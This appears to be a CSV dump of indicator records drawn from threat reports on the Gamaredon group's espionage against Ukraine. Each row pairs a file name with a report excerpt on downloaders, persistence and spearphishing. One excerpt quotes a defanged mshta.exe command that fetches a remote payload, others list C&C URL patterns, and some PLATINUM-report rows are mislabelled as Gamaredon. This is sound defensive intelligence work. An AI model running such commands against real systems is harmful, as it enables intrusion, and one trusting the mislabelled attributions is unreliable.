1.0.0,actor--gamaredon,artifact--sha256:c0b99cfd375a22552fb8ad55dd31b3711a87202caacfccfedaacb46156698a6a,observation--sha256:a1db09c350ef3ec3f964943f317ea412ecc92f416ec010735c628fe7a84a31fa,file-name,letter.lnk,letter.lnk,candidate,,unknown,unknown,not-stated,,source--gamaredon--56ce9c37d34fb725,Gamaredon/BlueAlpha Abuses Cloudflare Tunneling Service for GammaDrop Staging Infrastructure.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS Thearchivefiledownloadedinthisexampleisa7zipfilenamed56-27-11875.rar (a7zipfilewitha.rarextension). Oncedecompressed, asingledirectorynamed56-27-11875isextractedcontaininga.lnkfilenamedЗапит 56-27-11875 від 15.08.2024. Інформація з обмеженим доступому службовому листі відсутня. lnk, asshowninFigure7. ThefilenameroughlytranslatestoRequest 56-27-11875 dated August 15, 2024. There is no restricted accessinformation in the service letter.lnk. Figure7 Contentsofsmuggled7ziparchiv",
1.0.0,actor--gamaredon,artifact--sha256:caa81c1c9cfada3c58f140ef0b5c939702cde8877de72f5cbcfbd1dbd8977a32,observation--sha256:9aac0aaad553d90bea4b6931934601ae709dc9848927738c30e096e58b48aa16,file-name,link.php,link.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:242ea78d52f8c12d06f2a157343d3edd23d8cf6593e10e9bc54ad51eddcf85a4,observation--sha256:9ad9657278ed521407de6a3945de163911f18639e668b50dbf20153b4747cae7,file-name,lnk.php,lnk.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:797dcdaad80cf8dd4e1e718afba22af460212f0cbf68aef7b36fa6afc0bde422,observation--sha256:1100d7a158bab2ef3a23e25901782f7b1d51179c8dc14bc89f83bced861df8c4,file-name,log.php,log.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:e68669fe5287c69b19581195c324f21b7d04d0e3236f062ce9528f8dc0a4843e,observation--sha256:3e5a53bb9c43576f3785bfcbd4a548623c1ca27048c51849b965d54a912de2d5,file-name,login.php,login.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:e8faf95b2ba1b4ca1ca12d944dcd9d066ff37190e69db7306e0d27edd32a572a,observation--sha256:7a09f05e7d48b715d4bce41b3aff52db283a59eda97274f75c1b1c13648031ef,file-name,lsass.exe,lsass.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:e8faf95b2ba1b4ca1ca12d944dcd9d066ff37190e69db7306e0d27edd32a572a,observation--sha256:2b62567da517e3018a0b3bf3dc67a2fdc50695ea352856549f2ae5945f45b45f,file-name,lsass.exe,lsass.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Hot patcher One of PLATINUM’s most recent and interesting tools is meant to inject code into processes using a variety of injection techniques. In addition to using several publicly known injection methods to perform this task, it also takes advantage of an obscure operating system feature known as hot patching. Hot patching is an operating system-supported feature for installing updates without having to reboot or restart a process. At a high level, hot patching can transparently apply patches ",
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:97d51bb8e933ea5e4d592fe578dca22ea1b5924915fd91308c1863b2391b7586,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--a0d52e16421d8b11,Gamaredon/Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Beyond Bullets and Bombs: An Examination of Armageddon Group's Cyber Warfare Against Ukraine 8 Here you see an example of one of the malicious docx files that Armageddon uses. MITRE ATT&CK TECHNIQUE NAME TECHNIQUE ID Spearphishing Attachment T1566.001 User Execution T1204.002 Template Injection T1221 TAR Contains Malicious LNK File Similarly, a compressed TAR file containing a malicious LNK file is sent through a phishing email. This LNK file initiates the next stage of the attack using mshta.ex",
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:2af4b771ec24d6618b68179b66958a839b4123d69cf92cbc0bc842b8e3982640,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--a0d52e16421d8b11,Gamaredon/Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Beyond Bullets and Bombs: An Examination of Armageddon Group's Cyber Warfare Against Ukraine 9 %windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu MITRE ATT&CK TECHNIQUE NAME TECHNIQUE ID Spearphishing Attachment T1566.001 User Execution T1204.002 System Binary Proxy Execution: Mshta T1218.005 Defense Evasion Abusing Telegram to Bypass DNS Generally in the second stage, a malicious VBScript is used then they abuse Telegram to get the real C2 IP address. For example http",
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:e9ae4702d9f6ff684e90f13b444ab0f76fe4de32dc70c67b93cc92b25f1ae90d,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 13. Resolving domain to IP It should be noted that the new file has the same name and location as the previous one, so it checks its existence before code will be written. If present, the previous file is deleted. The same names are misleading because the contents of all the files are different. The analysis of other scripts revealed the following additional functionality: - checking the mshta.exe process in the list of running processes and terminating it; - suspending its work for some ",
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:df0eba2c18c350a66132db6d53c6704a7caac095362a88f4223268ef59dc7129,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"- repeating the cycle laid down in the file, which allows you to download and run almost any file in the system and provides full control over the system; - checking the file size before start and in case of conformity to conditions, the file is started; - searching for all available disks with letters from ""D"" to ""Z""; - checking for the possibility of creating and executing processes, as well as the presence of a connection to the Internet and to the command & control server of attackers; - dow",
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:1f560996293a123282fe491387bfb57a7958ef8c6b0467ad42a9dfb3fea40a89,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 payload, pauses for a few seconds, and deletes all three files: the dropper, itself, and the VBScript payload. Throughout PteroCDrop’s lifetime, Gamaredon has used various compilers to build it and in some of the samples this PDB path was left: E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb Overall, the most prevalent payload delivered by PteroCDrop is a VBScript version of PteroLNK. During 2023",
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:41aec4aad7fee9640ad8cbb249cea686064a17775326bd30fd75d1df84a891d5,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,49 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tactic ID Name Description T1564.001 Hide Artifacts: Hidden Files and Directories PteroLNK creates hidden files. T1562.001 Impair Defenses: Disable or Modify Tools PteroSocks disables AMSI by calling the method AmsiUtils.Uninitialize . T1070.004 Indicator Removal: File Deletion PteroPSDoor deletes staged files after successful exfiltration. T1036.004 Masquerading: Masquerade Task or Service Gamaredon,
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:4e729dd13db57b7a4919caba9604946f95cb69b0cbc020e1d96dc2df750dc9cd,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"5 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 organization. These two methods are described rather briefly in this section, because they are examined in det ail in the respective sections covering the tools involved. Spearphishing campaigns A typical Gamaredon spearphishing campaign employs a spearphishing email with a malicious attachment that contains either a LNK or an HTA file that is served to a potential victim. The files from email attachm",
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:617b445143b9cade7ae176f3075ef15fccbf37219b6e3d0c0f8850cd3fe9b85a,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"6 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Figure 4. An example HTA file from a Gamaredon spearphishing campaign Later, around April 2023, the tactics, techniques, and procedures (TTPs) of Gamaredon’s spearphishing campaigns changed once again, using HTML smuggling to deliver a malicious HTA file via an HTML email attachment. Upon opening, the HTML document displays a dialog for downloading the archive, but the archive is in fact base64 encode",
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:79ba2649f93f0adae661a1e35b87f07ff85ea2309fdd5d899849d713bbcedc52,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"37 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1027.015 Obfuscated Files or Information: Compression Gamaredon uses, in its spearphishing campaigns, bzip2 -compressed HTA files, and HTA files packed in ZIP and RAR archives. T1027.016 Obfuscated Files or Information: Junk Code Insertion Gamaredon inserts junk code into its malicious tools. T1684.001 Social Engineering: Impersonation Gamaredon sends spearphishing emails impersonating Uk",
1.0.0,actor--gamaredon,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:d858377e843b5e512d6e785b5229d7c7186274929c684b55a393aec15753a93b,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"5 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances simulate downloading such archives. These archives contain a malicious HTA downloader that , when opened by a victim, launche s mshta.exe with a URL argument to fetch another HTA file that embeds the VBScript downloader, PteroSand (see Figure 1). Notably, in two campaigns, the HTA downloaders were compressed with bzip2 instead of being packed in archives. Figure 1. Simplified scheme of a typical Gama redon spearphish",
1.0.0,actor--gamaredon,artifact--sha256:79876571c5ebb71f275703b7b1fb71e69775d5fc6edcee514fa7587d73d6f96a,observation--sha256:af90981d689db6cabaf9e8a22d8a960d9e86e1040edc6a596ac64a46f810c529,file-name,mstbl.dll,mstbl.dll,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"2. The backdoor is injected into svchost using the hot patch API. Patching the loader is done by creating a section named \knowndlls\mstbl.dll. This DLL does not reside on disk, but is rather treated as a cached DLL by the session manager. It then proceeds to write a PE file within that section. 3. The PE file will have one section (.hotp1) with the hot patch header structure. This structure contains all the information necessary to perform the patching of function ntdll!LdrpMapViewOfSection, wh",
1.0.0,actor--gamaredon,artifact--sha256:eab832095e532a2e3dc4559274de011e25fcd354c91ac99b70c99e61def4a4d8,observation--sha256:188dd568ed16ba463459d53567d67396eb7e660c06278db48eb32433cb83516c,file-name,new.php,new.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:eab832095e532a2e3dc4559274de011e25fcd354c91ac99b70c99e61def4a4d8,observation--sha256:f0dc2b4d4da0e4ca57809d2758b154737d41880dd39d91531694ca9de9e11427,file-name,new.php,new.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:5a5d6f9b1145c3ebb3e248a90d68735d6324be08f47acab9ae8d20d7b18dc833,observation--sha256:25378a0120238ec7a633bc946fd87c4c3430dae481db19c0f0affae9784a0044,file-name,nslookup.exe,nslookup.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"17 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 12. PteroCache (prettified) Capabilities Once a minute, PteroCache downloads and executes a PowerShell payload, which can be any of the Gamaredon tools. Some instances we observed were able to deploy an unlimited number of payloads, while some could deploy only up to 10 payloads. Network protocol For communication with its C&C server, PteroCache uses an HTTP GET request with the HTTP header x - cache, in whic",
1.0.0,actor--gamaredon,artifact--sha256:4d2366b2628f40fcb0c3a802e9de09f6d9caa4a389d5960cb9c61585380c94dd,observation--sha256:96b099d726775d975d107e20d69e5fd9809433f2a89c9dd6afd13b15d18e4855,file-name,ntuser.dat,ntuser.dat,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"41 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %TEMP% \1.exe APPENDIX C: HOST-BASED ARTIFACTS ASSOCIATED WITH THE SECOND VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000001.regtrans -ms %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000002.regtrans -ms %PUBLIC% \ntuser.ini:SRV %PUBLIC% \ntuser.ini:LNK %USERPROFILE% \boot.ini:SRV %USERPROFILE% \boot.ini:LNK %USERPROFILE% \boot.ini:G",
1.0.0,actor--gamaredon,artifact--sha256:ca0a97bb1084ff84d7bc84b0e7a39688854f71c4e172a5e4753aaa28fdc98f3c,observation--sha256:077f48092b0b53487f3f69d1bc1bcdd32072c52a3c6f76911b2d8dae403917c3,file-name,ntuser.ini,ntuser.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"41 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %TEMP% \1.exe APPENDIX C: HOST-BASED ARTIFACTS ASSOCIATED WITH THE SECOND VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000001.regtrans -ms %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000002.regtrans -ms %PUBLIC% \ntuser.ini:SRV %PUBLIC% \ntuser.ini:LNK %USERPROFILE% \boot.ini:SRV %USERPROFILE% \boot.ini:LNK %USERPROFILE% \boot.ini:G",
1.0.0,actor--gamaredon,artifact--sha256:68d90a619b6a5a06c42a84be52b87f85b35548c983e0296d4b4b1864a084550f,observation--sha256:7cc575f71abf382b3ab81628ae246a3321ebab3331889fba249862e4723426d9,file-name,ops.doc,ops.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Lure documents are typically given topical names that may be of interest to the recipient. Such lures often address controversial subjects or offer provocative opinions, in an effort to incite the reader into opening them. Figure 3 shows a sample of such titles. Figure 3. Example document titles used by PLATINUM to deliver exploits SHA1 Filename e9f900b5d01320ccd4990fd322a459d709d43e4b Gambar gambar Rumah Gay Didiet Prabowo di Sentul Bogor.doc 9a4e82ba371cd2fedea0b889c879daee7a01e1b1 The real re",
1.0.0,actor--gamaredon,artifact--sha256:5ad84ffc465cd6b9e5e4849e98f978d051b5667a3bcdd7479e1f6401119f4951,observation--sha256:6d81bd61a94f53ef5bfdd2e6bdaacb5b0c225d54ea2355d9fcd564f9e7266528,file-name,p.exe,p.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:cff79c2bd62271c998a9d354bdf790bfe1a69640f33a6f9314974a9f8922e277,observation--sha256:56349dee24e00497268ea30d61e9eac5ba01904152b2fddd0c54a449a51dca5c,file-name,past.php,past.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:cff79c2bd62271c998a9d354bdf790bfe1a69640f33a6f9314974a9f8922e277,observation--sha256:6fd3884f4a1bf6635bf54d84ad275d03172c3fd1b97da097551c8730231337d0,file-name,past.php,past.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:40603f4c04f0f06edf0d9ea8b4ac0fa15e888d3ff4de5b3c6bad9d8c98b3e45d,observation--sha256:ece2d9134072b126adf9a4f6038ec86d0af3c5ffb18088068def07e7fac350d4,file-name,post.php,post.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:40603f4c04f0f06edf0d9ea8b4ac0fa15e888d3ff4de5b3c6bad9d8c98b3e45d,observation--sha256:b2024a5dfbc9d90c9653d7709fca3c57335319b7648bf56032e2ceb27319f818,file-name,post.php,post.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:9e1e14dcd5138870896705da546619d4a11b9097bbd1c298379e724b763d8d5c,observation--sha256:a3f182359a04c2657eeb52f89a2f0eec11aba3482caa8657e228c1f7778dda5e,file-name,power.php,power.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:9e1e14dcd5138870896705da546619d4a11b9097bbd1c298379e724b763d8d5c,observation--sha256:9f581e3ab13cdd5d50481ec2f8d0654b5782b2edc0c7e6cad96b05a83a554d26,file-name,power.php,power.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:9e1e14dcd5138870896705da546619d4a11b9097bbd1c298379e724b763d8d5c,observation--sha256:a5b8c40cf804f3355ac543801cfbad57162ce9f3249e169db23f914a1dcd3d47,file-name,power.php,power.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
